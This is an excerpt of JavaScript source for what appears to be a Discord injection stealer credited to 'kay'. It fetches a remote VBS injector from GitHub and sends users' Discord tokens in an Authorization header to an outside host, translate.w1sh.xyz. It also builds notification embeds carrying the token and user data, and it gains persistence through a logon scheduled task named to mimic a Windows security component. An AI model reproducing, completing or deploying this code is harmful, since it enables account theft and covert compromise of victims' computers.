...
const CONFIG = {
    ...
    injector_url: 'https://raw.githubusercontent.com/clowlyzx/discord-vbs-injector/main/injector.vbs',
    get: {
...
const notify = async (ctx, token, user) => {
    ...
    ctx.embeds.forEach(embed => {
        ...
        embed.footer = {
            text: 'github.com/clowlyzx/discord-injection - made by kay',
...
const forcePersistStartup = async () => {
    ...
    const checkScheduledTaskExists = () => {
        return new Promise((resolve) => {
            exec('schtasks /query /tn "WindowsSecurityHealthSystraykay"', (err) => {
                resolve(!err);
            });
        });
    };
    ...
    const createBatchFile = () => {
        const batContent = `
            ...
            schtasks /create /tn "WindowsSecurityHealthSystraykay" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
            if %ERRORLEVEL% EQU 0 (
...
const translateEmailUpdate = async (token, locale) => {
    ...
    try {
        ...
        const response = parseJSON(await request('GET', `https://translate.w1sh.xyz/translate?key=KAY_IS_GOD&text=${textParam}&language=${locale}`, {
            'Content-Type': 'application/json',
            'Authorization': token
        }));
